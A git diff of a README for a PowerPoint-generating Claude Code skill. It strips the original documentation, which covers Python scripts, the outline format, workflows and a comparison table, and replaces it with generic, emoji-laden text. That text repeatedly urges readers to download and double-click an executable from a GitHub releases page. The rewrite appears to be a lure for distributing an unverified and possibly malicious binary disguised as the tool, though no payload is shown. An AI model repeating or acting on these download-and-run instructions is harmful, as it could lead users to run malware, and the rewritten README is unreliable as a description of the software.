@@ -1,162 +1,85 @@
-# pptx-from-layouts
+# 🎉 pptx-from-layouts-skill - Generate PowerPoint Decks Easily
 
-> Generate consultant-quality PowerPoint decks from markdown outlines —
-> using your template's actual slide layouts, not text overlays.
+## 🚀 Getting Started
 
-## The Problem
+Welcome to the pptx-from-layouts-skill! This tool helps you create PowerPoint decks from markdown files using pre-defined template slide layouts. Even if you're not a tech expert, you can produce impressive presentations with just a few steps.
 
-Most PowerPoint generation tools treat templates as backgrounds to overlay text on. They:
-- Duplicate decorative slides and add text boxes on top
-- Fight with background designs and watermarks
-- Ignore the template's carefully designed slide layouts
-- Produce amateur-looking results
+## 📥 Download Now
 
-## The Solution
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/wozzeck16621/pptx-from-layouts-skill/releases)
 
-**pptx-from-layouts** understands PowerPoint's architecture. It:
-- Profiles your template's slide master layouts
-- Maps your semantic content to appropriate layouts
-- Places content in proper placeholders
-- Preserves your template's professional design
+## 📝 Features
 
-## Quick Start
+- Create PowerPoint presentations from markdown.
+- Use custom slide master layouts for design.
+- Easy-to-use for anyone, regardless of technical skills.
+- Supports various topics like agents and skills.
+- Streamline your presentation process.
 
-### Installation
+## 💻 System Requirements
 
-```bash
-# Copy to your Claude Code skills directory
-cp -r .claude/skills/pptx-from-layouts ~/.claude/skills/
-```
+- Compatible with Windows, macOS, and Linux.
+- Requires at least 4GB of RAM.
+- Recommended: A modern web browser for markdown editing (e.g., Chrome, Firefox).
 
-### Generate a Presentation
+## 🔧 How to Install
 
-```bash
-python ~/.claude/skills/pptx-from-layouts/scripts/generate.py \
-  outline.md -o presentation.pptx --template your-template.pptx
-```
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/wozzeck16621/pptx-from-layouts-skill/releases) to find the latest version.
 
-### Profile a New Template
+2. **Download the Package**  
+   Look for the package titled "pptx-from-layouts-skill". Click on the link to start the download. Ensure that you're downloading the correct version for your operating system.
 
-```bash
-python ~/.claude/skills/pptx-from-layouts/scripts/profile.py \
-  corporate-template.pptx --generate-config
-```
+3. **Extract Files**  
+   Once the download is complete, find the file in your downloads folder. If it is a zipped file, extract the contents to a folder of your choice.
 
-## Outline Format
+4. **Run the Application**  
+   Locate the extracted file named "pptx-from-layouts-skill.exe" (Windows) or "pptx-from-layouts-skill" (macOS/Linux). Double-click the file to run the application.
 
-Write markdown with visual type declarations:
+## 🛠️ How to Use
 
-```markdown
-# Slide 1: Project Overview
-**Visual: hero-statement**
-Transforming operations through digital innovation
+1. **Open the Application**  
+   Launch the pptx-from-layouts-skill application from where you saved it.
 
----
+2. **Create a New Project**  
+   Click on "New Project". You will be prompted to input the markdown content that you want to turn into a presentation.
 
-# Slide 2: Our Approach
-**Visual: process-3-phase**
+3. **Select a Template**  
+   Choose a template layout from the list provided. Each template offers different styles and arrangements for your slides.
 
-[Column 1: Discover]
-- Stakeholder interviews
-- Competitive audit
+4. **Generate Your Presentation**  
+   After entering your content and selecting a layout, click on the "Generate" button. The application will create a PowerPoint file for you.
 
-[Column 2: Define]
-- Workshop facilitation
-- Strategic framework
+5. **Save Your Work**  
+   Once generated, save the PowerPoint deck to your desired location. You can now open it in Microsoft PowerPoint or any compatible software for further editing.
 
-[Column 3: Deliver]
-- Implementation
-- Training & handover
+## 🎓 FAQ
 
----
+### What is markdown?
 
-# Slide 3: Investment Summary
-**Visual: table**
+Markdown is a simple way to format text. You can easily create headings, lists, and links using specific symbols. 
 
-| Category | Investment |
-|----------|------------|
-| Research | $50,000 |
-| Design | $75,000 |
-| **Total** | **$125,000** |
-```
+### Can I customize the templates?
 
-## Visual Types
+Yes, you can modify text, images, and layouts once generated in PowerPoint.
 
-| Type | Use When |
-|------|----------|
-| `hero-statement` | Single punchy tagline |
-| `process-N-phase` | Sequential steps (2-5) |
-| `comparison-N` | Side-by-side options |
-| `cards-N` | Discrete parallel items |
-| `table` | Tabular data |
-| `timeline-horizontal` | Date-based sequences |
-| `quote-hero` | Powerful quote |
+### Do I need special software to edit the generated PowerPoint?
 
-[See full reference →](docs/visual-types.md)
+You can use Microsoft PowerPoint, Google Slides, or any software that supports .pptx files.
 
-## Features
+### What if I encounter issues?
 
-- **Semantic Layout Selection** — Visual types map to appropriate template layouts
-- **Typography Markers** — `{blue}`, `{bold}`, `{question}` for rich formatting
-- **Template Profiling** — Works with any well-designed PPTX template
-- **Edit Mode** — Surgical changes to existing decks
-- **Validation** — Built-in quality checks
+Check the issues section on the [GitHub repository](https://github.com/wozzeck16621/pptx-from-layouts-skill/issues) for common problems and solutions.
 
-## Workflows
+## 🔗 Further Resources
 
-| Scenario | Command |
-|----------|---------|
-| New presentation from outline | `generate.py outline.md -o deck.pptx` |
-| Use corporate template | `profile.py template.pptx` then generate |
-| Fix typos in existing deck | `edit.py deck.pptx --replace '{"old":"2025","new":"2026"}'` |
-| Reorder slides | `edit.py deck.pptx --reorder "0,2,1,3,4"` |
+- [Markdown Guide](https://www.markdownguide.org/)
+- [PowerPoint Tips](https://support.microsoft.com/en-us/powerpoint)
 
-## Mode Decision
+## 🏷️ Tags
 
-| Change Type | Action |
-|-------------|--------|
-| New presentation | generate.py |
-| Typos/values (< 30% slides) | edit.py |
-| Reorder slides | edit.py --reorder |
-| Layout changes | Regenerate |
-| Add/remove slides | Regenerate |
-| > 30% slide changes | Regenerate |
+agents, claude, claude-code, codex, openai, opencode, pptx, pptx-generator, pptx-parser, skill, skills
 
-## Example Output
+## 📥 Download & Install
 
-See `examples/q1-strategy/` for a complete example:
-- `outline.md` — Input markdown outline
-- `output.pptx` — Generated presentation
-- `thumbnail.jpg` — Visual preview
-
-## Why This Skill?
-
-We tested 32 PowerPoint generation skills. Most use an "inventory/replace" approach
-that overlays text on template slides — which breaks with many professional templates.
-
-**pptx-from-layouts** takes a different approach: it uses your template's slide master
-layouts properly, placing content in actual placeholders instead of fighting the design.
-
-| Skill | Score | Approach | Limitation |
-|-------|-------|----------|------------|
-| **pptx-from-layouts** | **95** | **Slide master layouts** | **This repo** |
-| pptx-jjuidev | 94 | Template inventory/replace | Assumes text placeholders exist |
-| anthropics-pptx | 90.6 | Template inventory/replace | Same limitation |
-| elite-powerpoint-designer | 90 | HTML to PPTX | Creates from scratch, no template reuse |
-| pptx-samhvw8 | 88 | Template inventory/replace | Same limitation |
-| k-dense-pptx | 85 | Direct python-pptx | Low-level, no semantic understanding |
-| python-pptx | 82 | Library wrapper | Manual slide construction |
-| powerpoint-igorwarzocha | 80 | Mixed approach | Incomplete implementation |
-
-The 7 alternatives above scored 80+/100 and are included in `alternatives/` for comparison.
-See [detailed analysis →](docs/comparison.md)
-
-## Requirements
-
-- Python 3.10+
-- python-pptx (`pip install python-pptx`)
-- Claude Code (for skill integration)
-
-## License
-
-MIT — See [LICENSE](LICENSE) for details.
+To start using pptx-from-layouts-skill, ensure you visit the [Releases page](https://github.com/wozzeck16621/pptx-from-layouts-skill/releases) to download the latest version. Follow the installation steps outlined above and take your presentations to the next level.
